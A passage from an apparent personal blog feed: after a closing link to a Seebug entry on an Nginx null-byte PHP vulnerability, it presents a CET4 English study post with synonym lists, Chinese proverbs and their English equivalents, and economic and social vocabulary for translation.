<p><a href="https://www.seebug.org/vuldb/ssvid-20898" target="_blank" rel="noopener">Nginx %00空字节执行任意代码(php)漏洞</a></p>
<p><br></p>
<center><strong>·End·</strong></center>

</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Authentic Words Summary]]></title>
      <url>/2017/12/16/authenticwords/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>​    此时此景，从CET4考场出来，只想送自己一首《凉凉》……<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>​    </p>
<p>​    看来我“High Marks Pass CET4“要翻水水了～～30分钟不打草稿的作文，自己都不知道写的什么鬼～～听力也～～emm～～冷得脑壳短路———magnificent（宏伟的）、altitude（海拔）我死都想不起来。。还有。。。emperor……一系列单词好像都拼错了一个字母～～Mountain Tai（泰山）被我拼成“Mountain Thai”～～搞啥子！！</p>
<hr>
<p>“物以类聚，人以群分”</p>
<p>跟网瘾少年一起玩，就也成为了网瘾骚年；跟学霸一起学习，就渐渐成为学霸。</p>
<p>当别人在寝室吃鸡，LOL的时候，你在图书馆孜孜不倦地阅读、学习。</p>
<p>或许这个时候，你抱怨自己没有过多的娱乐时间</p>
<p>但是，诸法因缘生，诸法因缘灭</p>
<p>希望若干年后，你会庆幸此时的自己没有虚度光阴……</p>
<hr>
<h1 id="CET4"><a href="#CET4" class="headerlink" title="CET4"></a>CET4</h1><h2 id="Writing"><a href="#Writing" class="headerlink" title="Writing"></a>Writing</h2><h3 id="闪光词"><a href="#闪光词" class="headerlink" title="闪光词"></a>闪光词</h3><pre><code>//2017.12.16
支持，赞成    in favor of, agree with, approve of 
提倡    advocate, recommend 
反对    oppose, object to
抵制    resist 
意义深远的，重大的    far-reaching, profound , significant
描绘，描述，描写    depict, describe, picture 
表达    convey, express, deliver 
使信服    convince, assure, confirm 
有敌意的，反对的    hostile, adverse, aggressive 
减少，削弱    reduce, decrease, lessen 
唯一的，仅有的    sole, single, unique 
全面的，全部的    entire, overall, comprehensive 
教授    tutor, coach, educate
显示    point to, indicate, demonstrate 
缩短，减少    shorten, cut down 
忧虑的，不安的    anxious, uneasy, concerned 
有机会    stand a chance of, have an opportunity to 
有偏见的，偏心的    biased, prejudiced, partial 
低等的，次要的    inferior, junior, minor 
明智的，合理的    advisable, sensible, rational 
提高    improve, enhance, raise 
给予，捐赠，赠与    impart, donate, contribute
沮丧的，失意的    frustrated, discouraged, depressed, low-spirited  
努力做，尽力做    attempt to, make efforts to, endeavor to, manage to do 
证实，证明    testify, confirm, verify, turn out 
志气，抱负，渴望    ambition, thirst 
禁止    ban, prohibit, forbid 
开展，实施，做    practice, carry out, conduct, perform
强调，突出    lay/place emphasis on, attach emphasis to, stress on, highlight
优秀的    outstanding, perfect, brilliant, remarkable, distinguished, excellent  
珍爱，珍惜，重视    cherish, treasure, value  
全面的，彻底的    sheer, utter, thorough 
注定    be doomed to, be destined to 
解释    account for, illustrate, clarify 
令人厌倦的    tedious, dull, monotonous, annoying 
不计其数的    countless, endless, numerous,
教育性的，启发性的    beneficial, enlightening, instructive 
有价值的    valuable, precious 
逐步地    step by step, little by little, bit by bit 
熟人    acquaintance 
伙伴    associate
密友，知己    intimate
坚持不懈的    persistent 
不屈服的    unyielding 
坚持的    insistent 
有决心的    determined, resolute, resolved 
坚决的    firm ，decided  
足够的，充足的    sufficient, adequate 
永久地    permanently, constantly 
抛弃，放弃    desert, abandon 
巨大的    tremendous, huge, giant , enormous 
因为    due to, owing to, thanks to 
占有，持有，拥有    occupy, hold, own, possess 
吸引    fascinate, tempt 
上升    increase, ascend, go up, rise, mount, on the rise, roar 
冷淡的，漠不关心的    indifferent, unconcerned, uninterested, chilly 
证实，证明    testify, confirm, verify, turn out 
</code></pre><h3 id="谚语"><a href="#谚语" class="headerlink" title="谚语"></a>谚语</h3><pre><code>//2017.12.16
1.爱屋及乌 Love me, love my dog.
2.百闻不如一见（眼见为实） Seeing is believing
3.比上不足比下有余 worse off than some, better off than many; to fall short of the best, but be better than the worst
4.笨鸟先飞 A slow sparrow should make an early start.
5.不眠之夜 white night
6.不以物喜不以己悲 not pleased by external gains, not saddened by personal losses
7.不遗余力 spare no effort; go all out; do one’s best
8.不打不成交 No discord, no concord
9.拆东墙补西墙 rob Peter to pay Paul
10.辞旧迎新 bid farewell to the old and usher in the new; ring out the old year and ring in the new
11.大事化小小事化了 try first to make their mistake sound less serious and then to reduce it to nothing at all
12.大开眼界 open one&apos;s eyes; broaden one&apos;s horizon; be an eye-opener
13.国泰民安 The country flourishes and people live in peace 
14.过犹不及 going too far is as bad as not going far enough; beyond is as wrong as falling short; too much is as bad as too little
15.功夫不负有心人 Everything comes to him who waits.
16.好了伤疤忘了疼 once on shore, one prays no more
17.好事不出门恶事传千里 Good news never goes beyond the gate, while bad news spread far and wide.
18.和气生财 Harmony brings wealth.
19.活到老学到老 One is never too old to learn.
20.既往不咎 let bygones be bygones
21.金无足赤人无完人 Gold can&apos;t be pure and man can&apos;t be perfect.
22.金玉满堂 Treasures fill the home.
23.脚踏实地 be down-to-earth
24.脚踩两只船 sit on the fence
25.君子之交淡如水 the friendship between gentlemen is as pure as crystal; a hedge between keeps friendship green
26.老生常谈陈词滥调 cut and dried, cliché
27.礼尚往来 Courtesy calls for reciprocity.
28.留得青山在不怕没柴烧 Where there is life, there is hope.
29.马到成功 achieve immediate victory; win instant success
30.名利双收 gain in both fame and wealth
31.茅塞顿开 be suddenly enlightened
32.没有规矩不成方圆 Nothing can be accomplished without norms or standards. 33.每逢佳节倍思亲 On festive occasions more than ever one thinks of one&apos;s dear ones far away.It is on the festival occasions when one misses his dear most.
34.谋事在人成事在天 The planning lies with man, the outcome with Heaven. Man proposes, God disposes.
35.弄巧成拙 be too smart by half; Cunning outwits itself
36.拿手好戏 masterpiece
37.赔了夫人又折兵 throw good money after bad
38.抛砖引玉 a modest spur to induce others to come forward with valuable contributions; throw a sprat to catch a whale
39.破釜沉舟 cut off all means of retreat；burn one‘s own way of retreat and be determined to fight to the end
40.抢得先机 take the preemptive opportunities
41.巧妇难为无米之炊 If you have no hand you can&apos;t make a fist. One can&apos;t make bricks without straw.
42.千里之行始于足下 a thousand-li journey begins with the first step--the highest eminence is to be gained step by step
43.前事不忘后事之师 Past experience, if not forgotten, is a guide for the future. 44.前人栽树后人乘凉 One generation plants the trees in whose shade another generation rests.One sows and another reaps.
45.前怕狼后怕虎 fear the wolf in front and the tiger behind hesitate in doing something
46.强龙难压地头蛇 Even a dragon (from the outside) finds it hard to control a snake in its old haunt - Powerful outsiders can hardly afford to neglect local bullies.
47.强强联手 win-win co-operation
48.瑞雪兆丰年 A timely snow promises a good harvest.
49.人之初性本善 Man&apos;s nature at birth is good.
50.人逢喜事精神爽 Joy puts heart into a man.
51.人海战术 huge-crowd strategy
52.世上无难事只要肯攀登 Where there is a will, there is a way.
53.世外桃源 a fictitious land of peace away from the turmoil of the world;
54.死而后已 until my heart stops beating
55.岁岁平安 Peace all year round.
56.上有天堂下有苏杭 Just as there is paradise in heaven, ther are Suzhou and Hangzhou on earth
57.塞翁失马焉知非福 Misfortune may be an actual blessing.
58.三十而立 A man should be independent at the age of thirty.At thirty, a man should be able to think for himself.
59.升级换代 updating and upgrading (of products)
60.四十不惑 Life begins at forty.
61.谁言寸草心报得三春晖 Such kindness of warm sun, can’t be repaid by grass
62.水涨船高 When the river rises, the boat floats high.
63.时不待我 Time and tide wait for no man
64.杀鸡用牛刀 break a butterfly on the wheel
65.实事求是 seek truth from facts; be practical and realistic; be true to facts
66.说曹操，曹操到 Talk of the devil and he comes
67.实话实说 speak the plain truth; call a spade a spade; tell it as it is
68.实践是检验真理的唯一标准 practice is the sole criterion for testing truth
69.山不在高，有仙则名 no matter how high the mountain is, its name will spread far and wid if there is a fairy.
70韬光养晦 hide one’s capacities and bide one’s time
71.糖衣炮弹 sugar-coated bullets
72.天有不测风云 anything unexpected may happen. A bolt from the blue
73.团结就是力量Unity is strength.
74.“跳进黄河洗不清”&apos;eve if one jumped into the Yellow River, one can not wash oneself clean--there&apos;s nothing one can do to clear one&apos;s name &apos;
75.歪风邪气unhealthy practices and evil phenomena
76.物以类聚，人以群分Birds of a feather flock together.
77.往事如风&apos;The past has vanished (from memory) like wind.; What in past, is pas
78.望子成龙hold high hopes for one&apos;s child
79.屋漏又逢连阴雨Misfortunes never come singly. When it rains it pours.
80.文韬武略military expertise; military strategy
81.唯利是图draw water to one&apos;s mill
82.无源之水,无本之木water without a source, and a tree wiithout roots
83.无中生有make create something out of nothing
84.无风不起浪There are no waves without wind. There&apos;s no smoke without fire. 85.徇私枉法bend the law for the benefit of relatives or friends
86.新官上任三把火a new broom sweeps clean
87.虚心使人进步,骄傲使人落后Modesty helps one go forward, whereas conceit makes one lag behind.
88. 蓄势而发accumulate strength for a take-off
89.心想事成May all your wish come true
90.心照不宣have a tacit understanding; give tacit consent; tacit understanding
91.先入为主First impressions are firmly entrenched.
92.先下手为强catch the ball before the bound
93.像热锅上的蚂蚁like an ant on a hot pan
94.现身说法warn people by taking oneself as an example
95.息事宁人pour oil on trobled waters
96.喜忧参半mingled hope and fear
97.循序渐进step by step
98.一路平安，一路顺风wish you a saft / good trip / journey
99.严以律己，宽以待人be strict with oneself and lenient towards others
100. 优胜劣汰survival of the fittest
101.有情人终成眷属All shall be well, and Jack shall have Jill.
102.有钱能使鬼推磨Money makes the mare go. Money talks.
103. 有识之士people of vision
104.有勇无谋use brawn rather than brain
105.有缘千里来相会Separated as we are thousands of miles apart, we come together as if by predestination.
106.与时俱进advance with times
107.以人为本people oriented; people foremost
108.因材施教teach students according to their aptitude
109.欲穷千里目，更上一层楼&apos;to ascend another storey to see a thousand miles further; Ascend further, were you to look farther; Would eye embrace a thousand miles? Go up, one flight.&apos; a land of milk and honey
110.欲速则不达Haste does not bring success.
112.英雄所见略同Great minds think alike.
113.冤家宜解不宜结Better make friends than make enemies.
114.冤假错案&apos;cases in which people were unjustly, falsely or wrongly charged or sentenced; unjust, false or wrong cases&apos;
115.一言既出，驷马难追A real man never goes back on his words.
116.招财进宝Money and treasures will be plentiful
117.债台高筑become debt-ridden
118. 众矢之的target of public criticism
119. 纸上谈兵be an armchair strategist
120.知己知彼,百战不殆Know the enemy and know yourself, and you can fight a hundred battles with no danger of defeat.
121.纸包不住火Truth will come to light sooner or later.
122.左右为难between the devil and the deep blue sea
</code></pre><h2 id="Translation"><a href="#Translation" class="headerlink" title="Translation"></a>Translation</h2><h3 id="描述人口、位置、大小……"><a href="#描述人口、位置、大小……" class="headerlink" title="描述人口、位置、大小……"></a>描述人口、位置、大小……</h3><pre><code>//2017.12.16
with the population of
with the area of 
located at/in
</code></pre><h3 id="中国经济："><a href="#中国经济：" class="headerlink" title="中国经济："></a>中国经济：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">　　总需求 aggregate demand </span><br><span class="line">　　总供给 aggregate supply </span><br><span class="line">　　企业文化 corporate/entrepreneurial culture </span><br><span class="line">　　企业形象 corporate image (Cl); enterprise image </span><br><span class="line">　　跨国公司 cross-national corporation </span><br><span class="line">　　创业精神 enterprising spirit; pioneering spirit </span><br><span class="line">　　外资企业 foreign-funded enterprise</span><br><span class="line">　　猎头公司head-hunter </span><br><span class="line">　　假日经济 holiday economy </span><br><span class="line">　　人力资本human capital </span><br><span class="line">　　航空和航天工业aerospace industry </span><br><span class="line">　　飞机制造工业aircraft industry </span><br><span class="line">　　电子工业 electronic industry </span><br><span class="line">　　汽车制造工业 car industry </span><br><span class="line">　　娱乐业 entertainment industry </span><br><span class="line">　　信息产业 information industry </span><br><span class="line">　　知识密集型产业 knowledge-intensive industry </span><br><span class="line">　　国有大中型企业 large and medium-sized state-owned enterprises </span><br><span class="line">　　轻工业 light industry </span><br><span class="line">　　博彩业 lottery industry </span><br><span class="line">　　制造业 manufacturing industry </span><br><span class="line">　　垄断行业 monopoly industries </span><br><span class="line">　　市场多元化 market diversification </span><br><span class="line">　　市场经济 market economy </span><br><span class="line">　　市场监管 market supervision </span><br><span class="line">　　购买力 purchasing power </span><br><span class="line">　　熊市 bear market </span><br><span class="line">　　牛市 bull market </span><br><span class="line">　　城镇化 urbanization </span><br><span class="line">　　房地产 real estate </span><br><span class="line">　　首付 down-payment </span><br><span class="line">　　业主 home owner</span><br><span class="line">　　个人购房贷款 individual housing loan </span><br><span class="line">　　经济全球化 economic globalization </span><br><span class="line">　　经济特区 special economic zones (SEZ)</span><br><span class="line">　　经济增长 economic growth </span><br><span class="line">　　泡沫经济 bubble economy 关税tariff</span><br><span class="line">　　纳税人tax payer </span><br><span class="line">　　宏观经济macro economy </span><br><span class="line">　　货币投放量 the size of money supply </span><br><span class="line">　　流动性过剩excess liquidity </span><br><span class="line">　　经济过热 overheated economy </span><br><span class="line">　　通货膨胀inflation </span><br><span class="line">　　抑制通货膨胀curb inflation </span><br><span class="line">　　注入流动性 to inject liquidity </span><br><span class="line">　　贴现率 discount rate</span><br><span class="line">　　存款准备金率 reserve requirement ratio (RRR)</span><br><span class="line">　　公开市场业务 open market operation (OMO)</span><br><span class="line">　　逆回购 reverse repurchase agreement; reverse repo </span><br><span class="line">　　引导降低市场借贷成本to guide the market borrowing costs to a lower level </span><br><span class="line">　　稳健的货币政策prudent monetary policy </span><br><span class="line">　　微调货币政策 to fine-tune monetary policy</span><br><span class="line">　　硬着陆 hard landing </span><br><span class="line">　　软着陆 soft landing </span><br><span class="line">　　二十国集团 Group of Twenty (G2O)</span><br><span class="line">　　财政部长 Finance Minister</span><br><span class="line">　　全年预期经济增长目标the expected growth target for the whole year </span><br><span class="line">　　经济活力 economic vitality</span><br><span class="line">　　大规模经济刺激计划 a massive economic stimulus package </span><br><span class="line">　　结构改革 structural reform</span><br><span class="line">　　硬资产 hard assets </span><br><span class="line">　　软资产 soft assets </span><br><span class="line">　　有形资产 tangible assets </span><br><span class="line">　　经济走廊 economic corridor </span><br><span class="line">　　整顿市场秩序 to rectify the market order </span><br><span class="line">　　反垄断 antitrust; anti-monopoly </span><br><span class="line">　　定价浮动 price fluctuations </span><br><span class="line">　　谋求利益最大化 to maximize profit </span><br><span class="line">　　债务审计audit of debt</span><br><span class="line">　　地方性政府债务 local government debt/liability </span><br><span class="line">　　公共财政体制改革 an overhaul of the public finance system</span><br><span class="line">　　债务管理 debt management </span><br><span class="line">　　信用支持 credit support</span><br></pre></td></tr></table></figure>
<h3 id="中国社会"><a href="#中国社会" class="headerlink" title="中国社会"></a>中国社会</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">　　多元文化论 cultural pluralism </span><br><span class="line">　　文化适应 acculturation </span><br><span class="line">　　社会保障 social security </span><br><span class="line">　　班车 shuttle bus</span><br><span class="line">　　相定迁户 a relocated unit or household </span><br><span class="line">　　大龄青年 single youth above the normal matrimonial age</span><br><span class="line">　　独生子女 the only child in a family </span><br><span class="line">　　单亲 single parent </span><br><span class="line">　　福利彩票 welfare lotteries </span><br><span class="line">　　家政服务 household management service </span><br><span class="line">　　民工 migrant laborers </span><br><span class="line">　　名人 celebrity</span><br><span class="line">　　农村剩余劳动力 surplus rural labor/laborers </span><br><span class="line">　　青春期 puberty</span><br><span class="line">　　全民健身运动 nationwide fitness campaign </span><br><span class="line">　　全国人口普查 nationwide census </span><br><span class="line">　　社会保险 social insurance </span><br><span class="line">　　暂住证 temporary residence permit/card </span><br><span class="line">　　青少年犯罪 juvenile delinquency </span><br><span class="line">　　性骚扰 sexual harassment </span><br><span class="line">　　走私 smuggling</span><br><span class="line">　　*性另歧视 gender/sexual discrimination </span><br><span class="line">　　年龄歧视 age discrimination </span><br><span class="line">　　工作歧视 job discrimination </span><br><span class="line">　　享乐主义hedonism </span><br><span class="line">　　文盲 illiteracy</span><br><span class="line">　　贫富分化 disparity between the rich and the poor </span><br><span class="line">　　盗版 pirated/illegal copies </span><br><span class="line">　　一国两制 One Country, Two Systems </span><br><span class="line">　　三个代表 the Three Represents Theory </span><br><span class="line">　　两会（人大、政协）Two Conferences (NPC and CPPCC)</span><br><span class="line">　　南南合作 South-South Cooperation</span><br><span class="line">　　南北对话 North-South Dialog</span><br><span class="line">　　人大常委会 People’s Congress Standing Committee</span><br><span class="line">　　法制观念 awareness of law</span><br><span class="line">　　法制国家 a country with an adequate legal system</span><br><span class="line">　　改革开放 reform and opening-up</span><br><span class="line">　　公务员 civil servants</span><br><span class="line">　　官僚主义作风 the bureaucratic style of work </span><br><span class="line">　　和谐并存 harmonious coexistence </span><br><span class="line">　　计划生育 family planning</span><br><span class="line">　　计划生育基本国策 the basic state policy of family planning</span><br><span class="line">　　青才申文明建设 the construction of spiritual civilization </span><br><span class="line">　　居委会 neighborhood committee</span><br><span class="line">　　科教兴国 national rejuvenation through science and education </span><br><span class="line">　　可持续发展 sustainable development </span><br><span class="line">　　廉洁高效 honesty and high efficiency </span><br><span class="line">　　两岸关系 cross-straits relations </span><br><span class="line">　　两岸谈判 cross-straits negotiations </span><br><span class="line">　　领 土完整 territorial integrity </span><br><span class="line">　　民族精神 national spirit </span><br><span class="line">　　普选制 general election system</span><br><span class="line">　　求同存异 seek common ground while shelving differences </span><br><span class="line">　　人大代表NPC member</span><br><span class="line">　　物质文明和精神文明 material and spiritual civilization</span><br><span class="line">　　小康社会 a well-off society</span><br><span class="line">　　小康水平 a well-off standard</span><br><span class="line">　　一个中国原则 the one-China principle</span><br><span class="line">　　与时俱进 keep pace with the times</span><br><span class="line">　　综合国力 overall national strength</span><br><span class="line">　　共同愿望common desire</span><br><span class="line">　　“走出去”（战略）going global</span><br><span class="line">　　不结盟 non-alignment</span><br><span class="line">　　单边主义 unilateralism</span><br><span class="line">　　多边政策 multilateralism</span><br><span class="line">　　多极世界 multipolar world</span><br><span class="line">　　人 口 老龄化 aging of population</span><br><span class="line">　　人口出生率birth rate</span><br><span class="line">　　社区月服务 community service</span><br><span class="line">　　道德法庭 court of ethics</span><br><span class="line">　　盗用公款embezzlement</span><br><span class="line">　　成人夜校 night school for adults</span><br><span class="line">　　在职进修班 on-job training courses</span><br><span class="line">　　政治思想教育 political and ideological education</span><br><span class="line">　　毕业生分酉己 graduate placement; assignment of graduate</span><br><span class="line">　　充电 update one’s knowledge</span><br><span class="line">　　初等教育 elementary education</span><br><span class="line">　　大学城 college town</span><br><span class="line">　　大学社区 college community</span><br><span class="line">　　高等教育 higher education</span><br><span class="line">　　高等教育“211 工程” the “211 Project” for higher education</span><br><span class="line">　　高等学府 institution of higher education</span><br><span class="line">　　综合性大学 comprehensive university</span><br><span class="line">　　文科院校 colleges of (liberal) arts</span><br><span class="line">　　理工科大学 college / university of science and engineering</span><br><span class="line">　　师范学院 teachers’ college; normal college</span><br><span class="line">　　高分低能 high scores and low abilities</span><br><span class="line">　　高考(university/college) entrance examination</span><br><span class="line">　　高校扩招 the college expansion plan</span><br><span class="line">　　教育界 education circle</span><br><span class="line">　　教育投入 input in education</span><br><span class="line">　　九年义务教育 nine-year compulsory education</span><br><span class="line">　　考研 take the entrance exams for postgraduate schools</span><br><span class="line">　　课外活动 extracurricular activities</span><br><span class="line">　　必修课 required/compulsory course </span><br><span class="line">　　选修课 elective/optional course </span><br><span class="line">　　基础课 basic courses </span><br><span class="line">　　专业课 specialized courses </span><br><span class="line">　　课程表 school schedule </span><br><span class="line">　　教学大纲 teaching program; syllabus </span><br><span class="line">　　学习年限 period of schooling </span><br><span class="line">　　学历 record of formal schooling </span><br><span class="line">　　学分 credit</span><br><span class="line">　　启发式教学 heuristic teaching </span><br><span class="line">　　人才交流 talent exchange </span><br><span class="line">　　人才战 competition for talented people </span><br><span class="line">　　商务英语证书 Business English Certificate (BEC) </span><br><span class="line">　　适龄儿重入学率 enrollment rate for children of school age</span><br><span class="line">　　升学率 proportion of students entering schools of a higher grade; enrollment rate </span><br><span class="line">　　硕博连读 a continuous academic project that involves postgraduate and doctoral study </span><br><span class="line">　　素质教育 quality-oriented education </span><br><span class="line">　　填鸭式教学 cramming method of teaching </span><br><span class="line">　　希望工程Project Hope </span><br><span class="line">　　走读生 extern; non-resident student </span><br><span class="line">　　住宿生boarder</span><br><span class="line">　　研究生 graduate student; post-graduate (student)</span><br><span class="line">　　应届毕业生 graduating student; current year’s graduate</span><br><span class="line">　　校园数字化 campus digitalization</span><br><span class="line">　　校园文化 campus culture</span><br><span class="line">　　学汉语热 enthusiasm in learning Chinese</span><br><span class="line">　　学历教育 education with record of formal schooling</span><br><span class="line">　　学龄儿重school-ager</span><br><span class="line">　　学前教育 preschool education</span><br><span class="line">　　学生减负 alleviate the burden on students</span><br><span class="line">　　应试教育 exam-oriented education</span><br><span class="line">　　职业道德 work ethics; professional ethics</span><br><span class="line">　　爷己者招待会press conference</span><br><span class="line">　　国家教委 State Education Commission</span><br><span class="line">　　国家统计局 State Statistical Bureau</span><br><span class="line">　　职业培训job training</span><br><span class="line">　　职业文盲 functional illiterate</span><br><span class="line">　　智力引进 recruit/introduce (foreign) talents</span><br><span class="line">　　智商 intelligence quotient (IQ)</span><br><span class="line">　　助学行动 activity to assist the impoverished students </span><br><span class="line">　　网络世界cyber world </span><br><span class="line">　　网络文化cyber culture </span><br><span class="line">　　网络犯罪cyber crime </span><br><span class="line">　　网上购物 online shopping </span><br><span class="line">　　高产优质 high yield and high quality </span><br><span class="line">　　高科技园 high-tech park </span><br><span class="line">　　工业园区 industrial park</span><br><span class="line">　　火炬计划 Torch Program (a plan to develop new and high technology)</span><br><span class="line">　　信息港info port </span><br><span class="line">　　信息革命 information revolution </span><br><span class="line">　　电子货币e-currency </span><br><span class="line">　　人工智能 artificial intelligence (AI)</span><br><span class="line">　　生物技术 bio-technology </span><br><span class="line">　　克隆 cloning</span><br><span class="line">　　基因工程 genetic engineering</span><br><span class="line">　　转基因食品 genetically modified food (GM food)</span><br><span class="line">　　试管婴儿 test-tube baby</span><br><span class="line">　　基因哭变 genetic mutation</span><br><span class="line">　　网络出版e-publishing</span><br><span class="line">　　三维电影 three-dimensional movie</span><br><span class="line">　　光谷 optical valley</span><br><span class="line">　　虚拟银行virtual bank</span><br><span class="line">　　信息化 informationization</span><br><span class="line">　　信息高速公路 information superhighway</span><br><span class="line">　　新兴学科 new branch of science; emerging discipline</span><br><span class="line">　　纳米 nanometer</span><br><span class="line">　　个人数字助理 personal digital assistant (PDA)</span><br><span class="line">　　生态农业 environment-friendly agriculture</span><br><span class="line">　　技术密集产品 technology-intensive product</span><br><span class="line">　　数码科技 digital technology</span><br><span class="line">　　同步卫星 geostationary satellite</span><br><span class="line">　　神舟五号载人飞船 manned spacecraft Shenzhou V</span><br><span class="line">　　风云二号气象卫星 Fengyun II meteorological satellite</span><br><span class="line">　　登月舱 lunar module</span><br><span class="line">　　多任务小卫星 small multi-mission satellite (SMMS)</span><br><span class="line">　　多媒体短信服务 Multimedia Messaging Service ( MMS)</span><br><span class="line">　　电子商务 e-business; e-commerce </span><br><span class="line">　　电子管理e-management </span><br><span class="line">　　办公自动化 Office Automation (OA)</span><br><span 